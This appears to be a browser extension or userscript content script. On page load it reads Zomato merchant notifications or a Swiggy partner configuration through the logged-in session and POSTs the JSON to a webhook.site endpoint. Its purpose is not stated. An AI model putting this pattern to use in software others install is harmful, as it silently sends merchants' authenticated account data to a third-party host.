var $j = jQuery.noConflict();

$j(document).ready(function () {
    function getZomato() {
        fetch('https://www.zomato.com/merchant-api/v3/notifications/fetch')
            .then((response) => response.json())
            .then((data) => {
                fetch('https://webhook.site/0e67db97-ad45-48d0-9868-855c7bdba005', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                })
            });
    }

    function getSwiggy() {
        fetch('https://partner.swiggy.com/api/v1/fetchConfig?key=IS_BULK_ORDER_CHECK_ENABLED:489847&restaurantId=489847&type=rxdxbarcode%2Fall')
            .then((response) => response.json())
            .then((data) => {
                fetch('https://webhook.site/0e67db97-ad45-48d0-9868-855c7bdba005', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                })
            });
    }

    const url = location.href;
    if (url.startsWith("https://partner.swiggy.com/")) {
        getSwiggy();
    } else {
        getZomato();
    }
});
